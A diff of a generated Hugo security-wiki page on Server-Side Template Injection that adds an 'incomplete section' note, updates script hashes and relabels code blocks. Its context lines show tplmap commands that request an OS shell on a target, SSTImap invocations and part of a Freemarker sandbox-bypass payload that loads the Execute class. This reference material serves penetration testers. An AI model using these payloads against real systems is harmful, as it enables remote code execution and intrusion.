@@ -16,7 +16,7 @@
 <link rel="icon" href="/favicon.png" type="image/x-icon">
 <link rel="stylesheet" href="/book.min.4b35fed0bea034bbc19c89c71e14b73fb9c68cfcc586b9382adfb9b7b103ba06.css" integrity="sha256-SzX&#43;0L6gNLvBnInHHhS3P7nGjPzFhrk4Kt&#43;5t7EDugY=" crossorigin="anonymous">
   <script defer src="/flexsearch.min.js"></script>
-  <script defer src="/en.search.min.049d4847a3aa1cf53d39e61af77abeb9ec59a646f1c2966b651eb9ac73e137b9.js" integrity="sha256-BJ1IR6OqHPU9OeYa93q&#43;uexZpkbxwpZrZR65rHPhN7k=" crossorigin="anonymous"></script>
+  <script defer src="/en.search.min.42c24b49fa2bd9a7bdb11c30a43d00df4dab358db93fecefd18b800583cb7f3f.js" integrity="sha256-QsJLSfor2ae9sRwwpD0A302rNY25P&#43;zv0YuABYPLfz8=" crossorigin="anonymous"></script>
 
   <script defer src="/sw.min.6f6f90fcb8eb1c49ec389838e6b801d0de19430b8e516902f8d75c3c8bd98739.js" integrity="sha256-b2&#43;Q/LjrHEnsOJg45rgB0N4ZQwuOUWkC&#43;NdcPIvZhzk=" crossorigin="anonymous"></script>
 
@@ -1143,6 +1143,7 @@ https://github.com/alex-shpak/hugo-book
   <ul>
     <li><a href="#server-side-template-injections">Server-Side Template Injections</a>
       <ul>
+        <li><a href="#note-that-hugo-still-has-some-difficulty-handling-certain-strings-in-certain-manners-here-and-its-under-investigation-but-for-now-this-section-is-incomplete-and-gray-hat-freelancing-is-aware">Note that Hugo still has some difficulty handling certain strings in certain manners here and it&rsquo;s under investigation, but.. for now.. this section is incomplete and Gray Hat Freelancing is aware</a></li>
         <li><a href="#tools">Tools</a></li>
         <li><a href="#methodology">Methodology</a></li>
         <li><a href="#detection">Detection</a>
@@ -1265,6 +1266,10 @@ https://github.com/alex-shpak/hugo-book
   Server-Side Template Injections
   <a class="anchor" href="#server-side-template-injections">#</a>
 </h1>
+<h2 id="note-that-hugo-still-has-some-difficulty-handling-certain-strings-in-certain-manners-here-and-its-under-investigation-but-for-now-this-section-is-incomplete-and-gray-hat-freelancing-is-aware">
+  Note that Hugo still has some difficulty handling certain strings in certain manners here and it&rsquo;s under investigation, but.. for now.. this section is incomplete and Gray Hat Freelancing is aware
+  <a class="anchor" href="#note-that-hugo-still-has-some-difficulty-handling-certain-strings-in-certain-manners-here-and-its-under-investigation-but-for-now-this-section-is-incomplete-and-gray-hat-freelancing-is-aware">#</a>
+</h2>
 <blockquote>
 <p>Template injection allows an attacker to include template code into an existing (or not) template. A template engine makes designing HTML pages easier by using static template files which at runtime replaces variables/placeholders with actual values in the HTML pages</p>
 </blockquote>
@@ -1275,12 +1280,12 @@ https://github.com/alex-shpak/hugo-book
 <p>Recommended tools:</p>
 <p><a href="https://github.com/epinna/tplmap">Tplmap</a> - Server-Side Template Injection and Code Injection Detection and Exploitation Tool</p>
 <p>e.g:</p>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-powershell" data-lang="powershell"><span style="display:flex;"><span>python2.7 ./tplmap.py -u <span style="color:#e6db74">&#39;http://www.target.com/page?name=John*&#39;</span> --os-shell
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>python2.7 ./tplmap.py -u <span style="color:#e6db74">&#39;http://www.target.com/page?name=John*&#39;</span> --os-shell
 </span></span><span style="display:flex;"><span>python2.7 ./tplmap.py -u <span style="color:#e6db74">&#34;http://192.168.56.101:3000/ti?user=*&amp;comment=supercomment&amp;link&#34;</span>
 </span></span><span style="display:flex;"><span>python2.7 ./tplmap.py -u <span style="color:#e6db74">&#34;http://192.168.56.101:3000/ti?user=InjectHere*&amp;comment=A&amp;link&#34;</span> --level <span style="color:#ae81ff">5</span> -e jade
 </span></span></code></pre></div><p><a href="https://github.com/vladko312/SSTImap">SSTImap</a> - Automatic SSTI detection tool with interactive interface based on <a href="https://github.com/epinna/tplmap">Tplmap</a></p>
 <p>e.g:</p>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-powershell" data-lang="powershell"><span style="display:flex;"><span>python3 ./sstimap.py -u <span style="color:#e6db74">&#39;https://example.com/page?name=John&#39;</span> -s
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>python3 ./sstimap.py -u <span style="color:#e6db74">&#39;https://example.com/page?name=John&#39;</span> -s
 </span></span><span style="display:flex;"><span>python3 ./sstimap.py -u <span style="color:#e6db74">&#39;https://example.com/page?name=Vulnerable*&amp;message=My_message&#39;</span> -l <span style="color:#ae81ff">5</span> -e jade
 </span></span><span style="display:flex;"><span>python3 ./sstimap.py -i -A -m POST -l <span style="color:#ae81ff">5</span> -H <span style="color:#e6db74">&#39;Authorization: Basic bG9naW46c2VjcmV0X3Bhc3N3b3Jk&#39;</span>
 </span></span></code></pre></div><h2 id="methodology">
@@ -1404,7 +1409,7 @@ https://github.com/alex-shpak/hugo-book
   <a class="anchor" href="#freemarker---sandbox-bypass">#</a>
 </h3>
 <p>:warning: only works on Freemarker versions below 2.3.30</p>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-js" data-lang="js"><span style="display:flex;"><span><span style="color:#f92672">&lt;</span><span style="color:#960050;background-color:#1e0010">#</span><span style="color:#a6e22e">assign</span> <span style="color:#a6e22e">classloader</span><span style="color:#f92672">=</span><span style="color:#a6e22e">article</span>.<span style="color:#66d9ef">class</span>.<span style="color:#a6e22e">protectionDomain</span>.<span style="color:#a6e22e">classLoader</span><span style="color:#f92672">&gt;</span>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-javascript" data-lang="javascript"><span style="display:flex;"><span><span style="color:#f92672">&lt;</span><span style="color:#960050;background-color:#1e0010">#</span><span style="color:#a6e22e">assign</span> <span style="color:#a6e22e">classloader</span><span style="color:#f92672">=</span><span style="color:#a6e22e">article</span>.<span style="color:#66d9ef">class</span>.<span style="color:#a6e22e">protectionDomain</span>.<span style="color:#a6e22e">classLoader</span><span style="color:#f92672">&gt;</span>
 </span></span><span style="display:flex;"><span><span style="color:#f92672">&lt;</span><span style="color:#960050;background-color:#1e0010">#</span><span style="color:#a6e22e">assign</span> <span style="color:#a6e22e">owc</span><span style="color:#f92672">=</span><span style="color:#a6e22e">classloader</span>.<span style="color:#a6e22e">loadClass</span>(<span style="color:#e6db74">&#34;freemarker.template.ObjectWrapper&#34;</span>)<span style="color:#f92672">&gt;</span>
 </span></span><span style="display:flex;"><span><span style="color:#f92672">&lt;</span><span style="color:#960050;background-color:#1e0010">#</span><span style="color:#a6e22e">assign</span> <span style="color:#a6e22e">dwf</span><span style="color:#f92672">=</span><span style="color:#a6e22e">owc</span>.<span style="color:#a6e22e">getField</span>(<span style="color:#e6db74">&#34;DEFAULT_WRAPPER&#34;</span>).<span style="color:#a6e22e">get</span>(<span style="color:#66d9ef">null</span>)<span style="color:#f92672">&gt;</span>
 </span></span><span style="display:flex;"><span><span style="color:#f92672">&lt;</span><span style="color:#960050;background-color:#1e0010">#</span><span style="color:#a6e22e">assign</span> <span style="color:#a6e22e">ec</span><span style="color:#f92672">=</span><span style="color:#a6e22e">classloader</span>.<span style="color:#a6e22e">loadClass</span>(<span style="color:#e6db74">&#34;freemarker.template.utility.Execute&#34;</span>)<span style="color:#f92672">&gt;</span>
@@ -1947,6 +1952,7 @@ https://github.com/alex-shpak/hugo-book
   <ul>
     <li><a href="#server-side-template-injections">Server-Side Template Injections</a>
       <ul>
+        <li><a href="#note-that-hugo-still-has-some-difficulty-handling-certain-strings-in-certain-manners-here-and-its-under-investigation-but-for-now-this-section-is-incomplete-and-gray-hat-freelancing-is-aware">Note that Hugo still has some difficulty handling certain strings in certain manners here and it&rsquo;s under investigation, but.. for now.. this section is incomplete and Gray Hat Freelancing is aware</a></li>
         <li><a href="#tools">Tools</a></li>
         <li><a href="#methodology">Methodology</a></li>
         <li><a href="#detection">Detection</a>
